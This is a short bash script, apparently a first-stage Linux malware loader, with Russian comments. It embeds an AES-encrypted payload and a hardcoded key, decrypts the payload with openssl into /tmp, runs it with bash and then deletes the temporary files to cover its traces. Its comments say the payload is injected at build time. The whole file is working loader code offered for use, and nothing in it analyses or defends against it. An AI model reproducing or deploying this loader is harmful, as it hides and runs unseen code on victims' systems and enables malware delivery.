#!/bin/bash
# AES-256-CBC decryptor template for Linux stage 1

PAYLOAD="0aec63b94fdcf2be7759fd0a3ee50343:b3G/It5JysDmMP3b6Fjp+aB983hngf4XPsSspFbJa0WZWrTuJvetqymwZ57vIKteBMwXaBMdFs7aWkBVOBTwGcZZMJpk8ZEmMuwNt/hP82fz+AcN+jUOk2J31/iMHWyspZlO/UXPPk+BZAEqdnDh8Dq8cIuwENn1hlRxGQ+/DNhJ4FJa2VzTk8fRu2JDTqBZW8VY2Lv5lXhxooYPu+74wFY3C4FEL7eLAwr7ndcDmagNMZQlinW2M7WJWcGGPvNsoBn5qJSbRLx+7jC0gb28z1gAYfSeOp+oLiz1fWktdD0WCYpFypAEj5uqGgGgGibstBmEDXemUxVEKSiQlGoh80/reEfoNGdsxDjt5X8T5Rk12nl7arvJCkRydFWU8I0Xow8K9sRnmcD43XBiqBVZ5gtM6M5qzXAMNzKCEFN351AUyFN4wbLOyg94z0g7vIvvqMIMhSEsi/YoFz48rNxj6NT2wz3DN94+KiNsgJxG+eE="  # encrypted ivhex:base64cipher, вставится на сборке
KEY="5a786376626e6d313233343536373839305a786376626e6d3132333435363738"      # AES ключ в HEX, совпадает с .env ENCRYPTION_KEY

iv=$(echo "$PAYLOAD" | cut -d: -f1)
cipher=$(echo "$PAYLOAD" | cut -d: -f2)

# Декодируем base64 в бинарник
echo "$cipher" | base64 -d > /tmp/cipher.bin

# Расшифровываем с помощью openssl (ключ уже в HEX, без конвертаций)
openssl enc -d -aes-256-cbc -K "$KEY" -iv "$iv" -in /tmp/cipher.bin -out /tmp/plaintext.sh

# Запускаем payload
bash /tmp/plaintext.sh

# Удаляем временные файлы
rm -f /tmp/cipher.bin /tmp/plaintext.sh
